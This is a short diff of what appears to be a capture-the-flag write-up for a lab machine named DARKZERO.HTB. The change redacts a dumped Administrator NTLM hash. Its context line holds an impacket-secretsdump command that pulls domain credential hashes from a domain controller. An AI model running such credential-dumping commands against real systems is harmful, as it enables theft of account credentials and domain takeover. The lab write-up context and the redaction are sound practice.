@@ -296,7 +296,7 @@ impacket-secretsdump -k -no-pass -dc-ip 10.129.11.196 'DARKZERO.HTB/dc01$@dc01.d
 Administrator:500:aad3b435b5<REDACTED>:::
 ```
 
-  - **Administrator NTLM Hash:** `5917507bdf2ef2c2b0a869a1cba40726`
+  - **Administrator NTLM Hash:** `5917507bd<REDACTED>`
 
 ## 4\. Final Access
 
